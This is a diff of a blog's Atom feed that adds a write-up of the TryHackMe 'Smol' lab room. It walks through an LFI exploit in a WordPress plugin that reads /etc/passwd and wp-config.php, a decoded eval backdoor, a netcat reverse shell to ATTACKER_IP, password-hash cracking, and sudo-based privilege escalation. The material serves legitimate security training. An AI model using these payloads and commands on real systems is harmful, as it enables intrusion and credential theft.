@@ -2,9 +2,190 @@
 <feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en">
   <title>aviskase</title>
   <id>https://www.aviskase.com/</id>
-  <updated>2025-02-13T04:47:13Z</updated>
+  <updated>2025-02-21T20:12:59Z</updated>
   <link rel="self" type="application/atom+xml" href="https://www.aviskase.com/feeds/all.atom.xml" hreflang="en"/>
   <link rel="alternate" type="text/html" href="https://www.aviskase.com/" hreflang="en"/>
+  <entry>
+    <title>Writeup: TryHackMe Smol</title>
+    <link rel="alternate" href="https://www.aviskase.com/articles/2025/02/21/writeup-tryhackme-smol/" hreflang="en"/>
+    <published>2025-02-21T20:12:59Z</published>
+    <updated>2025-02-21T20:12:59Z</updated>
+    <author><name>Yuliya Bagriy</name></author><id>tag:www.aviskase.com,2025-02-21:/articles/2025/02/21/writeup-tryhackme-smol/</id>
+    
+    <summary type="html"><![CDATA[<div class="callout info">
+    <ul>
+<li><a href="https://tryhackme.com/r/room/smol" class="external-link">Smol</a></li>
+<li>Difficulty: medium</li>
+<li>Platform: web, linux</li>
+</ul>
+<p>At the heart of Smol is a WordPress website, a common target due to its extensive plugin ecosystem. The machine showcases a publicly known vulnerable plugin, highlighting the risks of neglecting software updates and security patches. Enhancing the learning experience, Smol introduces a backdoored plugin, emphasizing the significance of meticulous code inspection before integrating third-party components.</p>]]></summary>
+    <content type="html"><![CDATA[<div class="callout info">
+    <ul>
+<li><a href="https://tryhackme.com/r/room/smol" class="external-link">Smol</a></li>
+<li>Difficulty: medium</li>
+<li>Platform: web, linux</li>
+</ul>
+<p>At the heart of Smol is a WordPress website, a common target due to its extensive plugin ecosystem. The machine showcases a publicly known vulnerable plugin, highlighting the risks of neglecting software updates and security patches. Enhancing the learning experience, Smol introduces a backdoored plugin, emphasizing the significance of meticulous code inspection before integrating third-party components.</p>
+<p>Quick Tips: Do you know that on computers without GPU like the AttackBox, John The Ripper is faster than Hashcat?</p>
+<p>Answer the questions below</p>
+<ol>
+<li>What is the user flag?</li>
+<li>What is the root flag?</li>
+</ol>
+</div>
+<p>The fun part of this room was hopping from one user to another in order to get the root. Vulnerabilities explored were:</p>
+<ul>
+<li>Vulnerable components with LFI and RCE</li>
+<li>Password reuse</li>
+<li>Weak passwords</li>
+<li>User access misconfiguration (group access, PAM, sudoers)</li>
+</ul>
+<div class="callout toc">
+<nav id="TableOfContents">
+  <ol>
+    <li><a href="#information-gathering">Information gathering</a></li>
+    <li><a href="#getting-into-the-wordpress-dashboard-via-lfi">Getting into the WordPress dashboard via LFI</a></li>
+    <li><a href="#finding-a-backdoored-plugin">Finding a backdoored plugin</a></li>
+    <li><a href="#getting-access-to-diego-and-user-flag">Getting access to <code>diego</code> and user flag</a></li>
+    <li><a href="#getting-access-to-think">Getting access to <code>think</code></a></li>
+    <li><a href="#getting-access-to-gege">Getting access to <code>gege</code></a></li>
+    <li><a href="#getting-access-to-xavi">Getting access to <code>xavi</code></a></li>
+    <li><a href="#getting-the-root-flag">Getting the root flag</a></li>
+  </ol>
+</nav>
+</div>  
+<h2 id="information-gathering" >
+  <a href="#information-gathering">Information gathering</a>
+</h2>
+<p>From the description it looks like we need to find one vulnerable WordPress plugin and with its help find another one. Webpage source code links to JS file belonging to the plugin <code>jsmol2wp</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>http://www.smol.thm/wp-content/plugins/jsmol2wp/JSmol.min.nojq.js?ver=14.1.7_2014.06.09
+</span></span></code></pre></div><p>This plugin has LFI vulnerability <a href="https://nvd.nist.gov/vuln/detail/CVE-2018-20463" class="external-link">CVE-2018-20463</a>.</p>
+<h2 id="getting-into-the-wordpress-dashboard-via-lfi" >
+  <a href="#getting-into-the-wordpress-dashboard-via-lfi">Getting into the WordPress dashboard via LFI</a>
+</h2>
+<p>I navigated to <code>http://www.smol.thm/wp-content/plugins/jsmol2wp/</code> to view plugin directory structure so that I could find the vulnerable file. To confirm the vulnerability:</p>
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?query=php://filter/resource=file:///etc/passwd
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>think:x:1000:1000:,,,:/home/think:/bin/bash
+</span></span><span style="display:flex;"><span>fwupd-refresh:x:113:117:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>mysql:x:114:119:MySQL Server,,,:/nonexistent:/bin/false
+</span></span><span style="display:flex;"><span>xavi:x:1001:1001::/home/xavi:/bin/bash
+</span></span><span style="display:flex;"><span>diego:x:1002:1002::/home/diego:/bin/bash
+</span></span><span style="display:flex;"><span>gege:x:1003:1003::/home/gege:/bin/bash
+</span></span></code></pre></div><p>From there I lost time trying to pivot <a href="https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/lfi2rce-via-php-filters.html" class="external-link">LFI2RCE via PHP filters</a> because I forgot about the second plugin. I wasn&rsquo;t able to make it work.</p>
+<p>My next step after reading hacktricks was checking <code>wp-config.php</code> file. There is a database user and password.</p>
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?query=php://filter/resource=../../../../wp-config.php
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>/** The name of the database for WordPress */
+</span></span><span style="display:flex;"><span>define( &#39;DB_NAME&#39;, &#39;wordpress&#39; );
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>/** Database username */
+</span></span><span style="display:flex;"><span>define( &#39;DB_USER&#39;, &#39;wpuser&#39; );
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>/** Database password */
+</span></span><span style="display:flex;"><span>define( &#39;DB_PASSWORD&#39;, &#39;REDACTED&#39; );
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>/** Database hostname */
+</span></span><span style="display:flex;"><span>define( &#39;DB_HOST&#39;, &#39;localhost&#39; );
+</span></span></code></pre></div><p>I logged in with this user and password at <code>http://www.smol.thm/wp-login.php</code></p>
+<h2 id="finding-a-backdoored-plugin" >
+  <a href="#finding-a-backdoored-plugin">Finding a backdoored plugin</a>
+</h2>
+<p>There, in the dashboard, I saw a private page <code>Webmaster Tasks!!</code>. It mentions plugin <code>Hello Dolly</code>. Using previously found LFI vulnerability I got its code:</p>
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?query=php://filter/resource=../../../plugins/hello.php
+</span></span></code></pre></div><p>The code has a weird line:</p>
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#cba6f7">eval</span>(base64_decode(<span style="color:#a6e3a1">&#39;CiBpZiAoaXNzZXQoJF9HRVRbIlwxNDNcMTU1XHg2NCJdKSkgeyBzeXN0ZW0oJF9HRVRbIlwxNDNceDZkXDE0NCJdKTsgfSA=&#39;</span>));
+</span></span></code></pre></div><p>Decoding it from base64:</p>
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span> <span style="color:#cba6f7">if</span> (isset(<span style="color:#f5e0dc">$_GET</span>[<span style="color:#a6e3a1">&#34;</span><span style="color:#89b4fa">\143\155\x64</span><span style="color:#a6e3a1">&#34;</span>])) { system(<span style="color:#f5e0dc">$_GET</span>[<span style="color:#a6e3a1">&#34;</span><span style="color:#89b4fa">\143\x6d\144</span><span style="color:#a6e3a1">&#34;</span>]); } 
+</span></span></code></pre></div><p>Looks like a promised backdoor. Next, I decoded the parameter name:</p>
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ php -r <span style="color:#a6e3a1">&#39;echo &#34;\143\155\x64 \143\x6d\144&#34;;&#39;</span> 
+</span></span><span style="display:flex;"><span>cmd cmd
+</span></span></code></pre></div><p>To confirm the backdoor I passed <code>cmd</code> query parameter in the dashboard so that result was shown on the page:</p>
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>http://www.smol.thm/wp-admin/index.php?cmd=whoami
+</span></span></code></pre></div><p>Having confirmed RCE, I started a reverse shell:</p>
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>http://www.smol.thm/wp-admin/?cmd=rm %2Ftmp%2Ff%3Bmkfifo %2Ftmp%2Ff%3Bcat %2Ftmp%2Ff|%2Fbin%2Fbash -i 2&gt;%261|nc ATTACKER_IP 443 &gt;%2Ftmp%2Ff
+</span></span></code></pre></div><p>Make sure to stabilize shell.</p>
+<h2 id="getting-access-to-diego-and-user-flag" >
+  <a href="#getting-access-to-diego-and-user-flag">Getting access to <code>diego</code> and user flag</a>
+</h2>
+<p>Since I already knew database user and password, I connected to the database and got users table:</p>
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>$ mysql -u wpuser -p
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>mysql&gt; use wordpress;
+</span></span><span style="display:flex;"><span>mysql&gt; select user_login, user_pass from wp_users;
+</span></span><span style="display:flex;"><span>+------------+------------------------------------+
+</span></span><span style="display:flex;"><span>| user_login | user_pass                          |
+</span></span><span style="display:flex;"><span>+------------+------------------------------------+
+</span></span><span style="display:flex;"><span>| admin      | $P$REDACTED                        |
+</span></span><span style="display:flex;"><span>| wpuser     | $P$REDACTED                        |
+</span></span><span style="display:flex;"><span>| think      | $P$REDACTED                        |
+</span></span><span style="display:flex;"><span>| gege       | $P$REDACTED                        |
+</span></span><span style="display:flex;"><span>| diego      | $P$REDACTED                        |
+</span></span><span style="display:flex;"><span>| xavi       | $P$REDACTED                        |
+</span></span><span style="display:flex;"><span>+------------+------------------------------------+
+</span></span></code></pre></div><p>John the Ripper with <code>rockyou</code> wordlist cracked a password for the user <code>diego</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ cat pass   
+</span></span><span style="display:flex;"><span>admin:<span style="color:#f5e0dc">$P$REDACTED</span>
+</span></span><span style="display:flex;"><span>wpuser:<span style="color:#f5e0dc">$P$REDACTED</span>
+</span></span><span style="display:flex;"><span>think:<span style="color:#f5e0dc">$P$REDACTED</span>
+</span></span><span style="display:flex;"><span>gege:<span style="color:#f5e0dc">$P$REDACTED</span>
+</span></span><span style="display:flex;"><span>diego:<span style="color:#f5e0dc">$P$REDACTED</span>
+</span></span><span style="display:flex;"><span>xavi:<span style="color:#f5e0dc">$P$REDACTED</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$ john -w<span style="color:#89dceb;font-weight:bold">=</span>/usr/share/wordlists/rockyou.txt pass   
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$ john --show pass
+</span></span><span style="display:flex;"><span>diego:REDACTED
+</span></span></code></pre></div><p>In the current reverse shell I changed user to <code>diego</code> and got the flag:</p>
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ su diego
+</span></span><span style="display:flex;"><span>$ cat /home/diego/user.txt
+</span></span><span style="display:flex;"><span>REDACTED
+</span></span></code></pre></div><h2 id="getting-access-to-think" >
+  <a href="#getting-access-to-think">Getting access to <code>think</code></a>
+</h2>
+<p>While exploring the system I was able to read private SSH key of the user <code>think</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ ls /home/think/.ssh
+</span></span><span style="display:flex;"><span>authorized_keys
+</span></span><span style="display:flex;"><span>id_rsa
+</span></span><span style="display:flex;"><span>id_rsa.pub
+</span></span></code></pre></div><p>I copied it to the attack machine and logged in via SSH.</p>
+<h2 id="getting-access-to-gege" >
+  <a href="#getting-access-to-gege">Getting access to <code>gege</code></a>
+</h2>
+<p>Another interesting file I saw was <code>/home/gege/wordpress.old.zip</code> which I wasn&rsquo;t able to access.</p>
+<p>Using <a href="https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS" class="external-link">LinPEAS</a> I didn&rsquo;t find anything except for its suggestion to try login as different users without a password. Which, surprisingly, worked: <code>su gege</code>. It did <a href="https://jaxafed.github.io/posts/tryhackme-smol/#shell-as-gege" class="external-link">because of PAM configuration</a> in <code>/etc/pam.d/su</code>.</p>
+<h2 id="getting-access-to-xavi" >
+  <a href="#getting-access-to-xavi">Getting access to <code>xavi</code></a>
+</h2>
+<p>File <code>wordpress.old.zip</code> was password-protected. I copied it to the attack machine and ran John the Ripper again:</p>
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ zip2john wordpress.old.zip &gt; wp   
+</span></span><span style="display:flex;"><span>$ john -w<span style="color:#89dceb;font-weight:bold">=</span>/usr/share/wordlists/rockyou.txt wp
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>$ john --show pass 
+</span></span><span style="display:flex;"><span>REDACTED    
+</span></span></code></pre></div><p>After unzipping the archive I found another <code>wp-config.php</code> file:</p>
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>define( &#39;DB_NAME&#39; &#39;wordpress&#39; );
+</span></span><span style="display:flex;"><span>define( &#39;DB_USER&#39;, &#39;xavi&#39; );
+</span></span><span style="display:flex;"><span>define( &#39;DB_PASSWORD&#39;, &#39;REDACTED&#39; )
+</span></span><span style="display:flex;"><span>define( &#39;DB_HOST&#39;, &#39;localhost&#39; );  
+</span></span></code></pre></div><p>Attempt to change user to <code>xavi</code> with this password was successful.</p>
+<h2 id="getting-the-root-flag" >
+  <a href="#getting-the-root-flag">Getting the root flag</a>
+</h2>
+<p>Checking privileges for user <code>xavi</code> showed that they can run all commands with <code>sudo</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ sudo -l
+</span></span><span style="display:flex;"><span><span style="color:#89dceb;font-weight:bold">[</span>sudo<span style="color:#89dceb;font-weight:bold">]</span> password <span style="color:#cba6f7">for</span> xavi: 
+</span></span><span style="display:flex;"><span>Matching Defaults entries <span style="color:#cba6f7">for</span> xavi on smol:
+</span></span><span style="display:flex;"><span>    env_reset, mail_badpass, <span style="color:#f5e0dc">secure_path</span><span style="color:#89dceb;font-weight:bold">=</span>/usr/local/sbin<span style="color:#89b4fa">\:</span>/usr/local/bin<span style="color:#89b4fa">\:</span>/usr/sbin<span style="color:#89b4fa">\:</span>/usr/bin<span style="color:#89b4fa">\:</span>/sbin<span style="color:#89b4fa">\:</span>/bin<span style="color:#89b4fa">\:</span>/snap/bin
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>User xavi may run the following commands on smol:
+</span></span><span style="display:flex;"><span>    <span style="color:#89dceb;font-weight:bold">(</span>ALL : ALL<span style="color:#89dceb;font-weight:bold">)</span> ALL
+</span></span></code></pre></div><p>Finally, the root flag:</p>
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ sudo cat /root/root.txt
+</span></span><span style="display:flex;"><span>REDACTED
+</span></span></code></pre></div>]]></content>
+  </entry>
   <entry>
     <title>Writeup: TryHackMe Injectics</title>
     <link rel="alternate" href="https://www.aviskase.com/articles/2025/02/13/writeup-tryhackme-injectics/" hreflang="en"/>
@@ -5095,8 +5276,8 @@ There was a time when every new tester came to me during the onboarding and aske
 <blockquote>
     <p>Designing good tests is one of the hardest tasks in software development.</p>
 </blockquote>
-<h3 id="lol-----ur-automashun-suckz" >
-  <a href="#lol-----ur-automashun-suckz">LOL &mdash; UR AUTOMASHUN SUCKZ!</a>
+<h3 id="lol--ur-automashun-suckz" >
+  <a href="#lol--ur-automashun-suckz">LOL &mdash; UR AUTOMASHUN SUCKZ!</a>
 </h3>
 <p>Your tests don&rsquo;t suck:</p>
 <ul>
